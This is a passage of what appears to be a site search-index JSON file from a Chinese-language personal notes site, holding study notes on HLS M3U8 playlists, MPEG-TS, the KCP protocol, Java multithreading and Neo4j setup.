\u6587\u4ef6\u5b9e\u8d28\u662f\u4e00\u4e2a\u64ad\u653e\u5217\u8868\uff08playlist\uff09\uff0c\u5176\u53ef\u80fd\u662f\u4e00\u4e2a\u5a92\u4f53\u64ad\u653e\u5217\u8868\uff08Media Playlist\uff09\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u4e3b\u5217\u8868\uff08Master Playlist\uff09\u3002\u4f46\u65e0\u8bba\u662f\u54ea\u79cd\u64ad\u653e\u5217\u8868\uff0c\u5176\u5185\u90e8\u6587\u5b57\u4f7f\u7528\u7684\u90fd\u662f UTF-8 \u7f16\u7801\u3002</p> <p>\u5f53 m3u8 \u6587\u4ef6\u4f5c\u4e3a\u5a92\u4f53\u64ad\u653e\u5217\u8868\uff08Media Playlist\uff09\u65f6\uff0c\u5176\u5185\u90e8\u4fe1\u606f\u8bb0\u5f55\u7684\u662f\u4e00\u7cfb\u5217\u5a92\u4f53\u7247\u6bb5\u8d44\u6e90\uff0c\u987a\u5e8f\u64ad\u653e\u8be5\u7247\u6bb5\u8d44\u6e90\uff0c\u5373\u53ef\u5b8c\u6574\u5c55\u793a\u591a\u5a92\u4f53\u8d44\u6e90\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684M3U8\u7684\u6587\u4ef6\u793a\u4f8b\uff1a</p> <pre><code>#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:8\n#EXT-X-MEDIA-SEQUENCE:2680\n\n#EXTINF:7.975,\nhttps://priv.example.com/fileSequence2680.ts\n#EXTINF:7.941,\nhttps://priv.example.com/fileSequence2681.ts\n#EXTINF:7.975,\nhttps://priv.example.com/fileSequence2682.ts\n#EXT-X-ENDLIST\n</code></pre> <p>\u9996\u5148\u6211\u4eec\u8bb2\u89e3\u4e00\u4e0b\u7d22\u5f15\u6587\u4ef6\u7684\u57fa\u672c\u683c\u5f0f\u8981\u6c42\uff1a</p> <ol> <li>m3u8 \u6587\u4ef6\u5fc5\u987b\u4ee5 UTF-8 \u8fdb\u884c\u7f16\u7801\uff0c\u4e0d\u80fd\u4f7f\u7528 Byte Order Mark\uff08BOM\uff09\u5b57\u8282\u5e8f\uff0c \u4e0d\u80fd\u5305\u542b UTF-8 \u63a7\u5236\u5b57\u7b26\u3002</li> <li>m3u8 \u6587\u4ef6\u7684\u6bcf\u4e00\u884c\u8981\u4e48\u662f\u4e00\u4e2a URI\uff0c\u8981\u4e48\u662f\u7a7a\u884c\uff0c\u8981\u4e48\u5c31\u662f\u4ee5 <code>#</code> \u5f00\u5934\u7684\u5b57\u7b26\u4e32\u3002\u4e0d\u80fd\u51fa\u73b0\u7a7a\u767d\u5b57\u7b26\uff0c\u9664\u4e86\u663e\u793a\u58f0\u660e\u7684\u5143\u7d20\u3002</li> <li>m3u8 \u6587\u4ef6\u4e2d\u4ee5 <code>#</code> \u5f00\u5934\u7684\u5b57\u7b26\u4e32\u8981\u4e48\u662f\u6ce8\u91ca\uff0c\u8981\u4e48\u5c31\u662f\u6807\u7b7e\u3002\u6807\u7b7e\u4ee5 <code>#EXT</code> \u5f00\u5934\uff0c\u5927\u5c0f\u5199\u654f\u611f\u3002</li> </ol> <p>\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230M3U8\u7684\u57fa\u7840\u6807\u7b7e\u5982\u4e0b\uff1a</p> <ol> <li>#EXTM3U: \u8868\u660e\u8be5\u6587\u4ef6\u662f\u4e00\u4e2a M3U8\u6587\u4ef6\u3002\u6bcf\u4e2a M3U8\u6587\u4ef6\u5fc5\u987b\u5c06\u8be5\u6807\u7b7e\u653e\u7f6e\u5728\u7b2c\u4e00\u884c</li> <li>#EXT-X-VERSION\uff1a\u8868\u660eHLS\u7248\u672c\u53f7</li> <li>#EXT-X-TARGETDURATION\uff1a\u8868\u660e\u6bcf\u4e2a\u7247\u6bb5\u7684\u6700\u5927\u65f6\u95f4\u8de8\u5ea6\uff0c\u4e5f\u5c31\u662f\u6bcf\u4e2a\u7247\u6bb5\u6700\u957f\u9650\u5236</li> <li>#EXT-X-MEDIA-SEQUENCE\uff1a\u8868\u660e\u64ad\u653e\u7684\u8d77\u59cb\u7247\u6bb5\u7d22\u5f15\uff0c\u9ed8\u8ba4\u4ece0\u5f00\u59cb\u3002</li> <li> <p>#EXTINF\uff1a\u8868\u660e\u5a92\u4f53\u7247\u6bb5\u7684\u65f6\u957f\uff0c\u4e0b\u4e00\u884c\u5fc5\u987b\u8ddf\u4e0a\u5a92\u4f53\u7247\u6bb5\u7684\u5730\u5740\uff0c\u5426\u5219\u4e0d\u751f\u6548\u3002\u6570\u503c\u53ef\u4ee5\u4f7f\u6574\u6570\uff0c\u4e5f\u53ef\u4ee5\u662f\u5c0f\u6570\u3002</p> </li> <li> <p>#EXT-X-ENDLIST\uff1a\u8868\u660e\u64ad\u653e\u7247\u6bb5\u7ed3\u675f\u6807\u8bc6\uff0c\u5b58\u5728\u8868\u793a\u70b9\u64ad\uff0c\u4e0d\u5b58\u5728\u8868\u793a\u76f4\u64ad\u3002</p> </li> </ol>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#_2","title":"\u89c6\u9891\u7247\u6bb5","text":"<p>M3U8\u4e2d\u5b9a\u4e49\u7684\u64ad\u653e\u7247\u6bb5\u6709\u7279\u5b9a\u7684\u683c\u5f0f\u8981\u6c42\uff0c\u5728RFC 8216 - HTTP Live Streaming (ietf.org)\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u76ee\u524d\u652f\u6301\u7684\u7f16\u7801\u683c\u5f0f\u5982\u4e0b\uff1a</p> <ul> <li>MPEG-2 Transport Streams</li> <li>Fragmented MPEG-4</li> <li>Packed Audio</li> <li>WebVTT</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4f7f\u7528MPEG-2 Transport Streams\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u67b6\u6784\u56fe\u4e0a\u6240\u6807\u8bb0\u7684TS\u6587\u4ef6\uff0c\u8fd9\u79cd\u6587\u4ef6\u4e5f\u662f\u5b9e\u9645\u573a\u666f\u4e2d\u6700\u5e38\u7528\u7684\u7f16\u7801\u683c\u5f0f\u4e4b\u4e00\u3002</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#mpeg-2-transport-streams","title":"MPEG-2 Transport Streams","text":"<p>MPEG2-TS \u4f20\u8f93\u6d41\uff08MPEG-2 Transport Stream\uff1b\u53c8\u79f0MPEG-TS\u3001MTS\u3001TS\uff09\u662f\u4e00\u79cd\u6807\u51c6\u6570\u5b57\u5c01\u88c5\u683c\u5f0f,\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u89c6\u9891\u3001\u97f3\u9891\u4e0e\u9891\u9053\u3001\u8282\u76ee\u4fe1\u606f\uff0c\u5e94\u7528\u4e8e\u6570\u5b57\u7535\u89c6\u5e7f\u64ad\u7cfb\u7edf\u3002</p> <p>MPEG2-TS\u9762\u5411\u7684\u4f20\u8f93\u4ecb\u8d28\u662f\u5730\u9762\u548c\u536b\u661f\u7b49\u53ef\u9760\u6027\u8f83\u4f4e\u7684\u4f20\u8f93\u4ecb\u8d28\uff0c\u8fd9\u4e00\u70b9\u4e0e\u9762\u5411\u8f83\u53ef\u9760\u4ecb\u8d28\u5982DVD\u7b49\u7684MPEG PS\u4e0d\u540c\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5728Python-OpenCV\u4e2d\u76f4\u63a5\u4f7f\u7528<code>cv2</code></p> <p>todo \u8fd9\u91cc\u6211\u4eec\u7531\u4e8e\u65f6\u95f4\u5173\u7cfb\uff0c\u8c03\u6574\u53d1\u5c55\u65b9\u5411\u4e3a\u8bc6\u522b\u7ed3\u679c\u56de\u4f20</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#fragmented-mpeg-4","title":"Fragmented MPEG-4","text":"<p>cv2.VideoWriter_fourcc(\u2018X\u2019,\u2018V\u2019,\u2018I\u2019,\u2018D\u2019)</p> <p>MPEG-4\u7f16\u7801\u7c7b\u578b\uff0c\u89c6\u9891\u5927\u5c0f\u4e3a\u5e73\u5747\u503c\uff0cMPEG4\u6240\u9700\u8981\u7684\u7a7a\u95f4\u662fMPEG1\u6216M-JPEG\u76841/10\uff0c\u5b83\u5bf9\u8fd0\u52a8\u7269\u4f53\u53ef\u4ee5\u4fdd\u8bc1\u6709\u826f\u597d\u7684\u6e05\u6670\u5ea6\uff0c\u95f4/\u65f6\u95f4/\u753b\u8d28\u5177\u6709\u53ef\u8c03\u6027\u3002\u6587\u4ef6\u6269\u5c55\u540d.avi\u3002</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#kcp","title":"\u57fa\u4e8eKCP\u7684\u4f20\u8f93\u670d\u52a1","text":"<p>\u3010skywind3000/kcp:  KCP - A Fast and Reliable ARQ Protocol (github.com)\u3011</p> <p>\u3010HatBoy/Python-KCP: Python2/Python3 binding for KCP (github.com)\u3011</p> <p>\u3010\u8be6\u89e3 KCP \u534f\u8bae\u7684\u539f\u7406\u548c\u5b9e\u73b0 - Luyu Huang's Blog\u3011</p> <p>\u3010\u5728\u7f51\u7edc\u4e2d\u72c2\u5954\uff1aKCP\u534f\u8bae (zhihu.com)\u3011</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#kcp_1","title":"KCP\u4ecb\u7ecd","text":"<p>KCP\u662f\u4e00\u4e2a\u5feb\u901f\u53ef\u9760\u7684 ARQ (Automatic Repeat-reQuest, \u81ea\u52a8\u91cd\u4f20\u8bf7\u6c42) \u534f\u8bae, \u91c7\u7528\u4e86\u4e0d\u540c\u4e8e TCP \u7684\u81ea\u52a8\u91cd\u4f20\u7b56\u7565, \u6709\u7740\u6bd4 TCP \u66f4\u4f4e\u7684\u7f51\u7edc\u5ef6\u8fdf. \u5b9e\u9645\u901a\u5e38\u4f7f\u7528 KCP over UDP \u4ee3\u66ff TCP, \u5e94\u7528\u5728\u7f51\u7edc\u6e38\u620f\u548c\u97f3\u89c6\u9891\u4f20\u8f93\u4e2d. </p>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/","title":"JAVA\u591a\u7ebf\u7a0b","text":""},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#1","title":"1. \u7ebf\u7a0b\u7684\u521b\u5efa","text":"<pre><code>flowchart LR\n\u521b\u5efaRunnable\u7684\u5b9e\u73b0\u7c7b--&gt;\u5b9e\u73b0run\u51fd\u6570--&gt;\u521b\u5efa\u5b9e\u73b0\u7c7b\u7684\u5bf9\u8c61,\u8c03\u7528start\u65b9\u6cd5.\n</code></pre>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#2","title":"2.\u7ebf\u7a0b\u521b\u5efa\u7684\u5177\u4f53\u65b9\u5f0f","text":"<ol> <li>\u901a\u8fc7\u7ee7\u627f<code>Thread</code>\u7c7b\u6765\u5b9e\u73b0\u591a\u7ebf\u7a0b\u521b\u5efa</li> </ol> <p>class TestThread extends Thread{        @Override        public void run(){            System.out.println(\"hello\");        }    }</p> <p>public class App{        public static void main(String[] args){            new TestThread().start();//\u521b\u5efa\u5e76\u6267\u884c\u4e86\u4e00\u4e2a\u7ebf\u7a0b        }    }    ```</p> <ol> <li>\u901a\u8fc7\u5b9e\u73b0<code>Runnable</code>\u7c7b\u548c<code>Thread</code>\u4ee3\u7406\u6765\u5b9e\u73b0\u591a\u7ebf\u7a0b\u521b\u5efa</li> </ol> <pre><code>class TestThread implements Runnable{\n    @Override\n    public void run(){\n        System.out.println(\"hello\");\n    }\n}\n\npublic class App{\n    public static void main(String[] args){\n        new Thread(new TestThread).start();//\u521b\u5efa\u5e76\u6267\u884c\u4e86\u4e00\u4e2a\u7ebf\u7a0b\n    }\n}\n</code></pre>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#3","title":"3. \u6bd4\u8f83\u4e24\u79cd\u65b9\u6cd5","text":"<p>\u7531\u4e8ejava\u5355\u7ee7\u627f\u7684\u5c40\u9650\u6027\uff0c\u4e00\u822c\u4e0d\u5efa\u8bae\u4f7f\u7528\u7b2c\u4e00\u79cd\u65b9\u5f0f\uff08\u76f4\u63a5\u7ee7\u627fThread\u7c7b\uff09\u6765\u521b\u5efa\u591a\u7ebf\u7a0b\uff0c\u800c\u4e14\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u521b\u5efa\u591a\u7ebf\u7a0b\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528lambda\u8868\u8fbe\u5f0f\u6216\u8005\u533f\u540d\u7c7b\uff0c\u6765\u5b9e\u73b0\u5177\u4f53\u591a\u7ebf\u7a0b\u4e2d\u8981\u6267\u884c\u7684\u5185\u5bb9\u3002</p>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#_1","title":"\u7ebf\u7a0b\u7684\u4f18\u5148\u7ea7","text":"<p>\u5728Java\u4e2d\u7684\u7ebf\u7a0b\u6267\u884c\u90fd\u662f\u6709\u4f18\u5148\u7ea7\u7684\uff0c\u4f46\u662f\u4f18\u5148\u7ea7\u9ad8\u5e76\u4e0d\u4ee3\u8868\u4e00\u5b9a\u5148\u6267\u884c\uff0c\u53ea\u662f\u8868\u793a\u5148\u6267\u884c\u7684\u6982\u7387\u66f4\u5927\u3002</p> <p>\u5728java\u4e2d\u6709\u4e2a<code>Thread</code>\u5b9a\u4e49\u4e86\u4e00\u4e9b\u57fa\u672c\u7684\u4f18\u5148\u7ea7\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u6700\u5927\u4f18\u5148\u7ea7\uff0c\u6700\u5c0f\u4f18\u5148\u7ea7\u548c\u6b63\u5e38\u4f18\u5148\u7ea7\u3002</p> \u4f18\u5148\u7ea7 \u6570\u6307 \u8bf4\u660e \u6700\u5927\u4f18\u5148\u7ea7 10 \u8d85\u51fa\u8fd9\u4e2a\u4f1a\u62a5\u9519 \u6b63\u5e38\u4f18\u5148\u7ea7 5 \u4e00\u822c\u7684\u7ebf\u7a0b\uff08\u6ca1\u6709\u8bbe\u7f6e\u4f18\u5148\u7ea7\u7684\u7ebf\u7a0b\uff09\u5c31\u662f\u8fd9\u4e2a\u503c\uff0c\u5305\u62ecmain\u7ebf\u7a0b \u6700\u5c0f\u4f18\u5148\u7ea7 1 \u4f4e\u4e8e\u8fd9\u4e2a\u4f1a\u62a5\u9519"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#_2","title":"\u7ebf\u7a0b\u7684\u5e38\u7528\u51fd\u6570","text":"<ol> <li> <p>start()\uff1a\u542f\u52a8\u7ebf\u7a0b</p> </li> <li> <p>sleep()\uff1a\u4f11\u7720\u7ebf\u7a0b</p> </li> <li> <p>setPriority()\uff1a\u8bbe\u7f6e\u7ebf\u7a0b\u4f18\u5148\u7ea7</p> </li> <li> <p>setDaemon()\uff1a\u8bbe\u7f6e\u4e3a\u5b88\u62a4\u7ebf\u7a0b</p> </li> <li> <p>join()\uff1a\u63d2\u961f\u7ebf\u7a0b\uff0c\u4e5f\u5c31\u662f\u524d\u884c\u8fdb\u5165\u6267\u884c\u72b6\u6001\uff0c\u76f4\u5230\u6267\u884c\u5b8c\uff0c\u5176\u4ed6\u7684\u7ebf\u7a0b\u624d\u80fd\u6267\u884c</p> </li> <li> <p>yield()\uff1a\u9759\u6001\u65b9\u6cd5\uff0c\u5f53\u524d\u7ebf\u7a0b\u793c\u8ba9\uff0c\u4e5f\u5c31\u662f\u5f3a\u5236\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u7ebf\u7a0b\u8fdb\u5165\u6302\u8d77\u72b6\u6001\u3002\u4f46\u662f\u6ca1\u6709\u6307\u660e\u63a5\u4e0b\u6765\u8c01\u6267\u884c\u3002</p> </li> <li> <p>getState()\uff1a\u83b7\u53d6\u7ebf\u7a0b\u72b6\u6001\u3002\u5728Thread\u4e2d\u6709\u5b9a\u4e49\u679a\u4e3e\u7c7b\u578b\u6765\u8868\u793a\uff0c\u4e00\u822c\u6709\u4e94\u79cd\u72b6\u6001\uff1a</p> </li> </ol> <ul> <li>NEW\uff1a\u65b0\u5efa\u7684\u7ebf\u7a0b\uff0c\u8fd8\u6ca1\u6709\u5524\u9192</li> <li>RUNNABLE\uff1a\u53ef\u6267\u884c\u72b6\u6001\uff0c\u8fd9\u5c31\u5305\u62ec\u6b63\u5728\u6267\u884c\u6216\u8005\u7b49\u5f85CPU\u9009\u4e2d\u4e24\u79cd\u60c5\u51b5\u3002</li> <li>BLOCKED\uff1a\u963b\u585e\u72b6\u6001\uff0c\u963b\u585e\u72b6\u6001\u662f\u7ebf\u7a0b\u963b\u585e\u5728\u8fdb\u5165synchronized\u5173\u952e\u5b57\u4fee\u9970\u7684\u65b9\u6cd5\u6216\u4ee3\u7801\u5757(\u83b7\u53d6\u9501)\u65f6\u7684\u72b6\u6001\u3002</li> <li>WAITING\uff1a \u7b49\u5f85\uff0c\u5904\u4e8e\u8fd9\u79cd\u72b6\u6001\u7684\u7ebf\u7a0b\u4e0d\u4f1a\u88ab\u5206\u914d CPU \u6267\u884c\u65f6\u95f4\uff0c\u5b83\u4eec\u8981\u7b49\u5f85\u88ab\u663e\u5f0f\u5730\u5524\u9192\uff0c\u5426\u5219\u4f1a\u5904\u4e8e\u65e0\u9650\u671f\u7b49\u5f85\u7684\u72b6\u6001\u3002</li> <li>TIMED_WAITING\uff1a\u8d85\u65f6\u7b49\u5f85\uff0c\u5904\u4e8e\u8fd9\u79cd\u72b6\u6001\u7684\u7ebf\u7a0b\u4e0d\u4f1a\u88ab\u5206\u914d CPU \u6267\u884c\u65f6\u95f4\uff0c\u4e0d\u8fc7\u65e0\u987b\u65e0\u9650\u671f\u7b49\u5f85\u88ab\u5176\u4ed6\u7ebf\u7a0b\u663e\u793a\u5730\u5524\u9192\uff0c\u5728\u8fbe\u5230\u4e00\u5b9a\u65f6\u95f4\u540e\u5b83\u4eec\u4f1a\u81ea\u52a8\u5524\u9192\u3002</li> <li>TERMINATED\uff1a\u7ec8\u6b62\u72b6\u6001\uff0c\u5f53\u7ebf\u7a0b\u7684 run() \u65b9\u6cd5\u5b8c\u6210\u65f6\uff0c\u6216\u8005\u4e3b\u7ebf\u7a0b\u7684 main() \u65b9\u6cd5\u5b8c\u6210\u65f6\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u5b83\u7ec8\u6b62\u4e86\u3002\u8fd9\u4e2a\u7ebf\u7a0b\u5bf9\u8c61\u4e5f\u8bb8\u662f\u6d3b\u7684\uff0c\u4f46\u662f\uff0c\u5b83\u5df2\u7ecf\u4e0d\u662f\u4e00\u4e2a\u5355\u72ec\u6267\u884c\u7684\u7ebf\u7a0b\u3002\u7ebf\u7a0b\u4e00\u65e6\u7ec8\u6b62\u4e86\uff0c\u5c31==\u4e0d\u80fd\u590d\u751f==\u3002</li> </ul>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#_3","title":"\u5b88\u62a4\u7ebf\u7a0b","text":"<p>\u5b88\u62a4\u7ebf\u7a0b\u76f8\u5f53\u4e8e\u662f\u4e00\u4e2a\u670d\u52a1\u4e00\u6837\uff0c\u4e0d\u4e00\u5b9a\u8981\u7b49\u5230\u4ed6\u7ed3\u675f\u6574\u4e2a\u7a0b\u5e8f\u624d\u80fd\u7ed3\u675f\uff0c\u4ed6\u5f80\u5f80\u53ea\u662f\u63d0\u4f9b\u67d0\u79cd\u670d\u52a1\uff0c\u5f53\u6211\u4eec\u7684\u4e3b\u8981\u903b\u8f91\u4e1a\u52a1\u7ed3\u675f\u65f6\uff0c\u4ed6\u4e5f\u5c31\u6ca1\u6709\u5b58\u5728\u7684\u610f\u4e49\uff0c\u4e5f\u5c31\u4f1a\u81ea\u52a8\u7ed3\u675f\uff0c\u5982\u6211\u4eec\u5e38\u8c08\u7684GCC\uff08\u5783\u573e\u56de\u6536\uff09\uff0c\u4ed6\u4e00\u76f4\u4fdd\u6301\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u7684\u4e3b\u65b9\u6cd5\u7ed3\u675f\u65f6\uff0c\u4ed6\u4e5f\u4fbf\u4f1a\u81ea\u52a8\u7ed3\u675f\u3002</p> <p>\u5e76\u4e0d\u662f\u8bf4\u5b88\u62a4\u7ebf\u7a0b\u4e00\u5b9a\u8981\u5199\u6210\u4e00\u4e2a\u6b7b\u5faa\u73af\u7b49\u5f85JVM\u5c06\u5176\u7ed3\u675f\uff0c\u4ed6\u4e5f\u53ef\u4ee5\u81ea\u5df1\u7ed3\u675f\uff0c\u53ea\u662f\u5f53\u6ca1\u6709\u7528\u6237\u7ebf\u7a0b\u6b63\u5728\u8fd0\u884c\u65f6\uff0cJVM\u4f1a\u5f3a\u5236\u7ed3\u675f\u5b88\u62a4\u7ebf\u7a0b\u3002</p>"},{"location":"Record%26Review/JAVA%E5%A4%9A%E7%BA%BF%E7%A8%8B/#synchronized","title":"synchronized","text":"<p>\u8fd9\u662f\u4e00\u4e2ajava\u5185\u7f6e\u7684\u9501\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f53\u505a\u5173\u952e\u5b57\u4f7f\u7528\u3002</p> <ul> <li>\u7528\u6cd5</li> </ul> <p>synchronized \u53ef\u4ee5\u7528\u6765\u4fee\u9970\u65b9\u6cd5\u6216\u8005\u4ee3\u7801\u5757\uff0c\u4f46\u662f\u4ed6\u9501\u4f4f\u7684\u4e0d\u662f\u4ee3\u7801\uff0c\u800c\u662f\u6570\u636e\uff0c\u5177\u4f53\u6240\u54ea\u4e2a\u6570\u636e\u53ef\u4ee5\u81ea\u5b9a\u4e49\u3002\u5982\u679c\u5199\u5728\u6210\u5458\u65b9\u6cd5\u4e0a\u9762\uff0c\u90a3\u4e48\u4ed6\u9501\u4f4f\u7684\u5c31\u662fthis\uff0c\u5982\u679c\u5b66\u58eb\u4ee3\u7801\u5757\uff0c\u5c31\u9700\u8981\u6307\u5b9a\u5bf9\u8c61\u4e0a\u9501\u3002</p> <pre><code>public class LockTest{\n    private int num;\n    private Date date;\n    //\u65b9\u6cd5\u4e0a\u9501\uff0c\u9ed8\u8ba4\u5c06\u65b9\u6cd5\u6240\u5c5e\u5bf9\u8c61\u4e0a\u9501\n    public synchronized int subNum(int sub){\n        if(sub&lt;=0){\n            this.num-=sub;\n        }\n        return num;\n    }\n\n    public String diffDate(Date d){\n        //\u6307\u5b9a\u5bf9\u8c61\u67b7\u9501\n        synchronized(data){\n            return date.compareTo(d);\n        }\n    }\n}\n</code></pre> <ul> <li>\u9501\u7684\u5de5\u4f5c\u6d41\u7a0b</li> </ul> <p>\u9996\u5148\u8981\u77e5\u9053JMM\uff08java memory module\uff0cjava\u5185\u5b58\u6a21\u578b\uff09,\u6bcf\u4e2a\u7ebf\u7a0b\u62e5\u6709\u81ea\u5df1\u7684\u4e00\u4e2a\u5de5\u4f5c\u7a7a\u95f4\uff0c\u7136\u540e\u5171\u4eab\u4e00\u5757\u4e3b\u5185\u5b58\uff0c\u4e3b\u5185\u5b58\u4e00\u822c\u653e\u7684\u5c31\u662f\u5171\u4eab\u6570\u636e\uff08\u5bf9\u8c61\uff09\uff0c\u5728\u6bcf\u4e2a\u7ebf\u7a0b\u542f\u52a8\u540e\uff0c\u90fd\u4f1a\u4ece\u4e3b\u5185\u5b58\u4e2d\u590d\u5236\u4e00\u4efd\u6570\u636e\uff08\u81ea\u5df1\u9700\u8981\u7684\uff09\u5230\u81ea\u5df1\u7684\u5de5\u4f5c\u7a7a\u95f4\u4e2d\u3002</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/","title":"Neo4J\u4f7f\u7528","text":""},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_1","title":"\u4ecb\u7ecd","text":"<p>Neo4J\u662f\u4e00\u4e2a\u7528Java\u5199\u7684\u56fe\u5f62\u6570\u636e\u5e93\uff0c\u6709\u793e\u533a\u7248\u548c\u4e13\u4e1a\u7248\uff0c\u793e\u533a\u7248\u5f00\u6e90neo4j/neo4j: Graphs for Everyone (github.com)</p> <p>\u8fd9\u91cc\u7684\u56fe\u5f62\u6570\u636e\u5e93\u4e2d\u7684\u56fe\u5f62\u5e76\u4e0d\u6307\u7684\u662f\u56fe\u7247\uff0c\u800c\u662f\u6570\u5b66\u4e2d\u7684\u4e00\u4e9b\u56fe\u8bba\u53ea\u662f\uff0c\u4e00\u822c\u7528\u6765\u8868\u793a\u5173\u8054\u3002\u5e38\u7528\u6765\u505a\u77e5\u8bc6\u56fe\u8c31\u548c\u76f8\u5173\u6027\u5206\u6790\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u63a8\u8350\u7b97\u6cd5</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_2","title":"\u5b89\u88c5","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1aNeo4j Desktop Download | Free Graph Database Download</p> <p>\u5b89\u88c5\u7684\u8bdd\u5c31\u6b63\u5e38\u5b89\u88c5</p> <p>\u8fd9\u91cc\u9700\u8981\u8bb2\u4e00\u4e0bwindow\u548cdesktop\u7684\u533a\u522b\u3002\u4ed6\u4eec\u90fd\u662f\u8fd0\u884c\u5728window\u4e0a\u7684\uff0c\u4f46\u662fwindow\u7248\u672c\u53ea\u5305\u62ec\u4e00\u4e2a\u670d\u52a1\uff0c\u5f53\u7136\u4e5f\u4f1a\u63d0\u4f9bweb\u7684\u7ba1\u7406\u754c\u9762\uff0c\u800cdesktop\u66f4\u50cf\u662f\u4e00\u4e2a\u7ba1\u7406\u7684\u7ee7\u627f\u5de5\u5177\uff0c\u6709\u70b9\u50cfJetBrain\u7684ToolBox\u5de5\u5177\u4e00\u6837\uff0c\u80fd\u8fc7\u63d0\u4f9b\u4e00\u4e9b\u65b9\u4fbf\u7684\u7ba1\u7406\u5de5\u5177\uff0c\u4f46\u662f\u4e0d\u5efa\u8bae\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u4f7f\u7528\u3002</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_3","title":"\u542f\u52a8","text":"<p>\u5728\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684\u7684bin\u76ee\u5f55\u4e2d\u6709\u4e2aneo4j.bat\uff0c\u8fd9\u4e2a\u5c31\u662f\u542f\u52a8\u811a\u672c\uff0c\u4f46\u662f\u76f4\u63a5\u70b9\u51fb\u662f\u65e0\u6cd5\u542f\u52a8\u7684\uff0c\u4ed6\u662f\u9700\u8981\u53c2\u6570\u7684\u3002\u4e00\u822c\u4f7f\u7528<code>\\neo4j.bat console</code>\u5373\u53ef\u542f\u52a8\u3002\u7136\u540e\u4ed6\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u672c\u5730\u7684\u5730\u5740\uff0c\u4e00\u822c\u662f<code>http://localhost:7474/</code>\uff0c\u8fdb\u5165\u5730\u5740\u4e4b\u540e\u767b\u5f55\uff0c\u521d\u59cb\u9ed8\u8ba4\u8d26\u53f7\u662f<code>neo4j</code>\uff0c\u5bc6\u7801\u4e5f\u662f<code>neo4j</code></p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_4","title":"\u57fa\u7840\u4ecb\u7ecd","text":""},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_5","title":"\u6a21\u578b","text":"<p>Neo4J\u91cc\u9762\u4e3b\u8981\u67093\u5927\u6a21\u578b\uff1a\u7ed3\u6784\u3001\u5c5e\u6027\u3001\u96c6\u5408\u3002</p> <ol> <li>\u5c5e\u6027\uff08\u80fd\u4f5c\u4e3a\u53c2\u6570\u8f93\u5165\u548c\u8fd4\u56de\uff09</li> </ol> \u7c7b\u578b \u8bf4\u660e Number \u6570\u5b57\u7c7b\u578b\uff0c\u65e2\u53ef\u4ee5\u8868\u793a\u6574\u6570\uff0c\u4e5f\u53ef\u8868\u793a\u5c0f\u6570 String \u5b57\u7b26\u4e32\u7c7b\u578b Boolean \u5e03\u5c14\u7c7b\u578b Temporal types \u65f6\u95f4\u7c7b\u578b\uff0c\u53ef\u4ee5\u5305\u62ec\uff1aDate, Time, LocalTime, DateTime, LocalDateTime and Duration The spatial type Point \u5730\u7406\u5750\u6807\u6570\u636e <ol> <li> <p>\u7ed3\u6784\uff08\u53ea\u80fd\u88ab\u8fd4\u56de\uff09</p> </li> <li> <p>\u8282\u70b9\uff1a\u5305\u62ecId\uff0c\u6807\u7b7e\uff08Label\uff09\uff0c\u548c\u5c5e\u6027</p> </li> <li>\u5173\u7cfb\uff1a\u5305\u542bId\uff0c\u7c7b\u578b\uff08Type\uff09\uff0c\u5c5e\u6027\uff0c\u59cb\u672b\u8282\u70b9\u7684Id</li> <li> 